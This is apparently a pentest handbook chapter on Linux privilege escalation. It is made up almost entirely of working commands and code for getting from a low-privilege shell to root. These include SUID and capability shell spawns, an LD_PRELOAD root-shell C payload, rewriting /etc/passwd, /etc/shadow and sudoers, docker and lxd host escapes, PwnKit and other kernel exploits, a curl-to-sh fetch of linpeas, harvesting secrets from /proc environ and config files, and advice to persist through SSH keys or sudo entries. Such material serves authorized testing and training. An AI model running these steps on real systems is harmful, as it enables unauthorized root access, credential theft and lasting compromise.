# 32 — Linux Privilege Escalation

From low-privilege shell to root. Order of operations: **enum thoroughly first**, then exploit one of the discovered paths.

## Contents

- [Initial recon](#initial-recon)
- [Automated enumeration](#automated-enumeration)
- [SUID / SGID binaries](#suid-sgid-binaries)
- [Capabilities](#capabilities)
- [sudo](#sudo)
- [Cron / scheduled jobs](#cron-scheduled-jobs)
- [PATH abuse](#path-abuse)
- [Writable system files](#writable-system-files)
- [NFS misconfiguration](#nfs-misconfiguration)
- [Kernel exploits](#kernel-exploits)
- [Service abuse](#service-abuse)
- [Container escape](#container-escape)
- [Reading sensitive files when you cannot become root](#reading-sensitive-files-when-you-cannot-become-root)
- [/etc/exports, mounted filesystems, and FUSE](#etcexports-mounted-filesystems-and-fuse)
- [SUID-escalating with `find` (timeless example)](#suid-escalating-with-find-timeless-example)
- [Hijacking shared libraries](#hijacking-shared-libraries)
- [Putting the path together](#putting-the-path-together)
- [Sources](#sources)

## Initial recon

```bash
id; whoami
hostname
uname -a
cat /etc/os-release
cat /proc/version
cat /etc/issue
cat /etc/lsb-release
arch
lscpu
echo $PATH
env
sudo -n -l 2>/dev/null
groups
```

## Automated enumeration

Always run an enum script — it covers more in 30 seconds than 30 minutes of manual work.

```bash
# linpeas
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a                            # all checks
./linpeas.sh -e                            # extra noisy
./linpeas.sh -s                            # superfast (skip slow checks)

# linenum (lighter, older)
./LinEnum.sh -t -k password

# linux-smart-enumeration
./lse.sh -l 1                              # 0=quiet, 1=normal, 2=loud

# pspy — see processes spawned by other users in real time (no root needed)
./pspy64
```

Color codes in linpeas: red/yellow = 95% probability finding, yellow = 50%, green = info.

## SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null              # SUID
find / -perm -2000 -type f 2>/dev/null              # SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
find / -perm -4000 -newer /tmp -type f 2>/dev/null  # SUID newer than /tmp
```

For each result, look it up on **GTFOBins**: https://gtfobins.github.io/. Common high-impact ones:

| Binary | Trick |
|---|---|
| `bash` | `bash -p` |
| `sh` | `sh -p` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `vim` | `vim -c ':!/bin/sh'` |
| `less` / `more` | `!/bin/sh` |
| `nmap` (old) | `--interactive` |
| `find` | `-exec /bin/sh -p \; -quit` |
| `cp` / `mv` | Overwrite `/etc/passwd` / `/etc/shadow` |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `nano` | `^R^X` to spawn shell |
| `wget` | Save remote `/etc/passwd` |
| `env` | `env /bin/sh -p` |

```bash
# Spawn with effective UID retained
/bin/bash -p
```

## Capabilities

A SUID-less mechanism for granting select root privileges to a binary.

```bash
getcap -r / 2>/dev/null
```

Critical capabilities:

| Capability | What |
|---|---|
| `cap_setuid+ep` | Change UID — direct root if binary lets you call `setuid(0)` |
| `cap_setgid+ep` | Change GID |
| `cap_dac_read_search` | Read any file (e.g. `/etc/shadow`) |
| `cap_dac_override` | Read/write any file |
| `cap_sys_admin` | "The dangerous one" — varies but often equivalent to root |
| `cap_sys_ptrace` | `gdb` into other procs |
| `cap_sys_module` | Load kernel modules |
| `cap_chown`, `cap_fowner` | Change ownership of any file |
| `cap_net_raw` | Raw sockets (sniffing, ARP) |
| `cap_net_admin` | Network admin (iptables) |

Examples:

```bash
# Python with setuid capability → instant root
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with setuid capability
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# tar with cap_dac_read_search → read shadow
tar -cf - /etc/shadow | tar -xf - -O
```

## sudo

```bash
sudo -l
sudo -V                       # version (look for known vulns)
```

### Common sudo abuses

```
(ALL) NOPASSWD: /usr/bin/foo            → run `foo` as root, then check GTFOBins
(ALL) NOPASSWD: ALL                      → sudo /bin/bash
(ALL) /usr/bin/find                      → sudo find . -exec /bin/sh \; -quit
(user) NOPASSWD: /opt/app/script.sh     → if path is writable, edit + sudo it
```

GTFOBins shows a `Sudo` section per binary — that is the canonical mapping for "user has sudo on X, what now".

### Sudoedit / `sudo -e`

`sudo -e` (or `sudoedit`) launches `EDITOR` as root on a temp copy. Old versions had race / symlink issues. Recent CVE-2023-22809 lets attacker append flags via the `EDITOR` env var.

### Wildcards in sudoers commands

```
(ALL) /usr/bin/cat /var/log/*           → sudo cat /var/log/../etc/shadow
(ALL) /usr/bin/tar -czf /backup/*.tar.gz /home/*    → checkpoint trick (see below)
```

### `LD_PRELOAD` / `LD_LIBRARY_PATH` via sudo `env_keep`

If `Defaults env_keep += LD_PRELOAD` is set:

```c
// pwn.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/pwn.so pwn.c
sudo LD_PRELOAD=/tmp/pwn.so <any-sudo-allowed-cmd>
```

### Sudo CVEs to remember

- **CVE-2019-14287** — `sudo -u#-1 cmd` runs as root on certain configs (sudo < 1.8.28).
- **CVE-2021-3156 (Baron Samedit)** — heap overflow, all defaults. sudo < 1.9.5p2.
- **CVE-2023-22809** — `sudoedit` env var injection.

## Cron / scheduled jobs

```bash
cat /etc/crontab
ls -la /etc/cron.{d,daily,hourly,weekly,monthly}
ls -la /var/spool/cron/{crontabs,}
cat /etc/anacrontab
systemctl list-timers
crontab -l                                  # current user
```

Find writable scripts that root runs:

```bash
find /etc/cron* -type f -writable 2>/dev/null
find / -path /proc -prune -o -type f -writable -name '*.sh' -print 2>/dev/null
```

`pspy` shows actual cron activations:

```bash
./pspy64                                    # watch and wait for periodic jobs
```

If a writable script runs as root: append a reverse shell or `chmod u+s /bin/bash`.

If `PATH=/usr/local/bin:/usr/bin:/bin` and root cron runs an unqualified binary, drop a binary with that name in a writable PATH directory.

## PATH abuse

A SUID/sudo binary or cron job that calls `service` instead of `/usr/sbin/service`:

```bash
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service
PATH=/tmp:$PATH sudo /opt/app/runner       # depending on env_keep / secure_path
```

## Writable system files

```bash
find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | grep -E '^/etc/|^/root/|^/var/' | head
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ /etc/crontab
find / -writable -type f -path '*/etc/*' 2>/dev/null
```

### Writable `/etc/passwd`

```bash
# Generate password hash
openssl passwd -1 -salt h Pass1
# → $1$h$qK3ZB...   add as root entry
echo 'evil:$1$h$qK3ZB...:0:0::/root:/bin/bash' >> /etc/passwd
su evil
```

### Writable `/etc/shadow`

```bash
# Replace root's hash
sed -i 's|^root:[^:]*:|root:'"$(openssl passwd -6 'Pass1')"':|' /etc/shadow
su -                                       # password Pass1
```

### Writable `/etc/sudoers` or files in `/etc/sudoers.d/`

```bash
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
# Then:
sudo -i
```

### Writable SSH `authorized_keys`

```bash
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
ssh root@localhost
```

## NFS misconfiguration

`/etc/exports` line with `no_root_squash` lets clients write files as root:

```bash
# On the client (your attacker box)
showmount -e <NFS-SERVER>
mount -t nfs <NFS-SERVER>:/share /mnt/x

# Drop a SUID bash
cp /bin/bash /mnt/x/rootbash
chmod +s /mnt/x/rootbash

# On the target (mounted directory):
/share/rootbash -p
```

## Kernel exploits

Older kernels have well-known LPE chains. Decide whether to use one — kernel exploits crash boxes if they fail.

```bash
uname -r
lsb_release -a / cat /etc/os-release
```

Common families to recognize (versions vary):

- **DirtyCow** — CVE-2016-5195 (kernel < 4.8.3)
- **DirtyPipe** — CVE-2022-0847 (kernel 5.8 - 5.16.x patched)
- **Dirty Sock** — `snapd` REST API
- **OverlayFS** — CVE-2021-3493, CVE-2023-0386
- **PwnKit (polkit)** — CVE-2021-4034 (almost everywhere; user-space, not kernel; same effect)
- **Looney Tunables (glibc)** — CVE-2023-4911
- **netfilter / nf_tables** — periodic; check year-by-year

```bash
# linux-exploit-suggester2
./linux-exploit-suggester.sh

# After uploading kernel-exploit binary
gcc exploit.c -o /tmp/exp -static
/tmp/exp
```

PwnKit is the modern default-attempt because polkit is everywhere and the exploit is reliable:

```bash
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit && make && ./PwnKit
```

## Service abuse

### Misconfigured systemd unit files

```bash
find / -name '*.service' -writable 2>/dev/null
systemctl list-unit-files --no-pager | grep enabled

# If a unit file is writable and the service runs as root, edit ExecStart:
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod u+s /tmp/rb'
systemctl daemon-reload
systemctl restart <unit>
/tmp/rb -p
```

### Runtime path / unit replacement

If `/etc/systemd/system/xyz.service` is read-only but `/etc/systemd/system/xyz.service.d/override.conf` is writable, drop an override.

### Docker socket

```bash
ls -la /var/run/docker.sock
# If readable by your user (or in `docker` group):
docker run -v /:/host -it alpine chroot /host sh
```

The `docker` group is effectively root.

### LXC / LXD

If the user is in the `lxd` group:

```bash
lxc image import alpine.tar.gz --alias x
lxc init x pwn -c security.privileged=true
lxc config device add pwn host disk source=/ path=/mnt/host recursive=true
lxc start pwn
lxc exec pwn -- chroot /mnt/host /bin/bash
```

### Kubernetes

```bash
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl run x --image=alpine -it --rm --command -- sh
# If you can create privileged pods:
kubectl run x --image=alpine --privileged --hostpid=true --hostnetwork=true --command -- sh
```

## Container escape

Inside a container, look for:

```bash
cat /proc/self/cgroup                       # confirms container
cat /proc/1/cgroup
ls /.dockerenv
mount | grep overlay
capsh --print
```

Escape paths:

- **Privileged container** — full host access via `mknod` / `--privileged` flag.
- **Mounted host filesystem** — `mount | grep ' / '` shows host's `/` mounted; just `chroot` in.
- **Mounted Docker socket** inside the container — same as above (host docker primitive).
- **Capabilities** — `CAP_SYS_ADMIN` enables many primitives (cgroup escape, etc.).
- **Kernel exploits** — kernel is shared with host; any host LPE works.
- **runc CVE-2019-5736** — overwrite `/proc/[host_pid]/exe`.

## Reading sensitive files when you cannot become root

```bash
# Pull files via SUID
sudo -u root cat /etc/shadow                 # if sudoers allows

# /proc/<pid>/environ — env vars of running processes (sometimes contain creds)
ls /proc/*/environ 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i -E 'pass|secret|key'

# Backup files / dumps
find / -name '*.bak' -o -name '*.old' -o -name '*~' 2>/dev/null
find / -name 'id_rsa*' 2>/dev/null
find / -name '*.kdbx' 2>/dev/null

# Database dumps and config
find / -name '*.sql' -size +1k 2>/dev/null
find /var/www -name '*.php' -exec grep -l 'password\|passwd' {} \; 2>/dev/null
```

## /etc/exports, mounted filesystems, and FUSE

```bash
mount
cat /etc/fstab
findmnt
```

CIFS shares mounted with `credentials=/etc/cred.txt` often have those creds readable. NFS mounts may give you write access to sensitive targets.

## SUID-escalating with `find` (timeless example)

```bash
find / -name 'doesnotexist' -exec /bin/bash -p \;        # only if find is SUID-root
```

## Hijacking shared libraries

If a SUID binary loads a library from a writable path:

```bash
ldd /usr/bin/some-suid
```

Replace `libfoo.so` in the writable directory with a malicious copy that runs your shell when loaded.

`LD_AUDIT` / `LD_PRELOAD` are usually stripped from privileged execution unless `secure_exec` is bypassed (see PwnKit-style exploits).

## Putting the path together

A typical Linux privesc looks like:

```
1. Run linpeas (or pspy if cron-suspect)
2. Pick the loudest red finding
3. Confirm by hand (read the file, check the cap)
4. Exploit (GTFOBins lookup if it is a binary)
5. Capture proof: `id`, `cat /root/<flag-or-file>`, screenshot
6. Persist if scope says so (extra SSH key, sudo entry)
```

Keep notes per host so the eventual report has the exact commands run.

## Sources

- GTFOBins: https://gtfobins.github.io/
- HackTricks — Linux privesc: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/
- PEASS-ng (linpeas): https://github.com/peass-ng/PEASS-ng
- pspy: https://github.com/DominicBreuker/pspy
- linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
- `man capabilities`, `man sudoers`, `man systemd.unit`.
